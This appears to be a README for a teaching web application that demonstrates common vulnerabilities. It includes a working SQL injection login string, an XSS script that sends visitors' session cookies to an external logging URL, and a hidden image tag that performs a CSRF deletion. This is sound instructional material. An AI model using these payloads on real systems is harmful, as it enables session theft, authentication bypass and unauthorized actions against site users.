# Introduction

This is a simple application that demonstrates a few typical web application vulnerablities. The example covers:

* an SQL injection vulnerability,
* a XSS vulnerability,
* a CSRF vulnerability,
* an improper storage of sensitive data,
* an improper use of HTTP methods,
* improperly secured URLS.

# SQL Injection 

username: "student' OR '"

# XSS 

XSS attack. This entry forces the visitor's browser to send its session cookie to the attacker's page.

<script>
var request = new XMLHttpRequest();
request.open("GET", "http://student-lem.fri.uni-lj.si/xss-logger/upload-cookies.php?" + document.cookie, true);
request.send(null);
</script>

# CSRF 

CSRF attack. This entry forces the visitor's browser to issue a GET request to the server. If the visitor is logged-in, the request will successfully access a protected resource -- will delete a joke.

<img src="joke/delete?id=5&delete_confirmation=on" width="0" height="0" />
